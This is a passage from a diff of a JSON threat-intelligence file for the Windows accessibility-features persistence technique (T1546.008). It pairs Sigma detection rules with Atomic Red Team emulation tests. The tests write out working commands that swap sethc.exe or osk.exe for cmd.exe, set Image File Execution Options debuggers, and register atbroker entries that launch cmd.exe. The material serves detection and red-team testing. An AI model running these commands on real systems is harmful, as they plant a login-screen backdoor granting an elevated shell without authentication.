Execution Options\\HelpPane.exe\\Debugger\nfalsepositives:\n- Unlikely\nid: baca5663-583c-45f9-b5dc-ea96a22ce542\nlevel: critical\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/11/26\nreferences:\n- https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/\n- https://bazaar.abuse.ch/sample/6f3aa9362d72e806490a8abce245331030d1ab5ac77e400dd475748236a6cc81/\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1546.008\n- car.2014-11-003\n- car.2014-11-008\ntitle: Sticky Key Like Backdoor Usage - Registry\n",
+                            "sigma:id": "baca5663-583c-45f9-b5dc-ea96a22ce542",
+                            "title": "Sticky Key Like Backdoor Usage - Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "e9b61244-893f-427c-b287-3e708f321c6b",
+                        "lookup_data": {
+                            "description": "Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.",
+                            "raw": "author: frack113\ndate: 2022/12/11\ndescription: Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility\n  on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated\n  command prompt to the user from the login screen without the need to log in.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains|all:\n    - mklink\n    - \\osk.exe\n    - \\cmd.exe\n  selection_img:\n  - Image|endswith: \\cmd.exe\n  - OriginalFileName: Cmd.Exe\nfalsepositives:\n- Unknown\nid: e9b61244-893f-427c-b287-3e708f321c6b\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/12/20\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1546.008/T1546.008.md\n- https://ss64.com/nt/mklink.html\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1546.008\ntitle: Potential Privilege Escalation Using Symlink Between Osk and Cmd\n",
+                            "sigma:id": "e9b61244-893f-427c-b287-3e708f321c6b",
+                            "title": "Potential Privilege Escalation Using Symlink Between Osk and Cmd",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1546.008",
+                "display_name": "Event Triggered Execution: Accessibility Features",
+                "atomic_tests": [
+                    {
+                        "name": "Attaches Command Prompt as a Debugger to a List of Target Processes",
+                        "auto_generated_guid": "3309f53e-b22b-4eb6-8fd2-a6cf58b355a9",
+                        "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "parent_list": {
+                                "description": "Comma separated list of system binaries to which you want to attach each #{attached_process}. Default: \"osk.exe\"\n",
+                                "type": "string",
+                                "default": "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe"
+                            },
+                            "attached_process": {
+                                "description": "Full path to process to attach to target in #{parent_list}. Default: cmd.exe\n",
+                                "type": "path",
+                                "default": "C:\\windows\\system32\\cmd.exe"
+                            }
+                        },
+                        "executor": {
+                            "command": "$input_table = \"#{parent_list}\".split(\",\")\n$Name = \"Debugger\"\n$Value = \"#{attached_process}\"\nForeach ($item in $input_table){\n  $item = $item.trim()\n  $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\"\n  IF(!(Test-Path $registryPath))\n  {\n    New-Item -Path $registryPath -Force\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force\n  }\n  ELSE\n  {\n    New-ItemProperty -Path $registryPath -Name $name -Value $Value\n  }\n}\n",
+                            "cleanup_command": "$input_table = \"#{parent_list}\".split(\",\")\nForeach ($item in $input_table)\n{\n  $item = $item.trim()\n  reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$item\" /v Debugger /f 2>&1 | Out-Null\n}\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Replace binary of sticky keys",
+                        "auto_generated_guid": "934e90cf-29ca-48b3-863c-411737ad44e3",
+                        "description": "Replace sticky keys binary (sethc.exe) with cmd.exe\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "IF NOT EXIST C:\\Windows\\System32\\sethc_backup.exe (copy C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc_backup.exe) ELSE ( pushd )\ntakeown /F C:\\Windows\\System32\\sethc.exe /A\nicacls C:\\Windows\\System32\\sethc.exe /grant Administrators:F /t\ncopy /Y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\n",
+                            "cleanup_command": "copy /Y C:\\Windows\\System32\\sethc_backup.exe C:\\Windows\\System32\\sethc.exe\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Create Symbolic Link From osk.exe to cmd.exe",
+                        "auto_generated_guid": "51ef369c-5e87-4f33-88cd-6d61be63edf2",
+                        "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n",
+                            "cleanup_command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Atbroker.exe (AT) Executes Arbitrary Command via Registry Key",
+                        "auto_generated_guid": "444ff124-4c83-4e28-8df6-6efd3ece6bd4",
+                        "description": "Executes code specified in the registry for a new AT (Assistive Technologies).\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\natbroker /start malware_test\n",
+                            "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Auto-start application on user logon",
+                        "auto_generated_guid": "7125eba8-7b30-426b-9147-781d152be6fb",
+                        "description": "Executes code specified in the registry on new user logon session automatically by registration of new AT and modification of configuration value.\nThis test will register new AT named malware_test with code for cmd.exe and add a configuration value for the code to be run during user logon session.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /v StartEXE /t REG_SZ /d C:\\WINDOWS\\system32\\cmd.exe /f\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /t REG_SZ /d malware_test /f\n",
+                            "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\\malware_test\" /f\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\\ATs\" /v Configuration /f\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 15:28:14"
+}
